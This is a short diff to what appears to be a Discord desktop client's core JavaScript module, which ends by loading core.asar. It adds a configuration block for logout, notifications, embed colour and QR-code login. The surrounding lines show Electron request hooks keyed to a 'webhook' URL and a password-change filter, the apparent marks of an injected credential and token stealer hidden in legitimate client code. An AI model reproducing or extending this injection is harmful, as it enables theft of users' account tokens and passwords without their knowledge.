@@ -40,6 +40,22 @@ String.prototype.insert = function (index, string) {
 
 
 
+const config = {
+
+    "logout": "false",
+
+    "logout-notify": "false",
+
+    "init-notify":"false",
+
+    "embed-color": 00000,
+
+    "disable-qr-code":"false"
+
+}
+
+
+
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
 
 	if (details.url.startsWith(webhook)) {
@@ -2909,4 +2925,3 @@ session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, ca
 });
 
 module.exports = require('./core.asar')
-
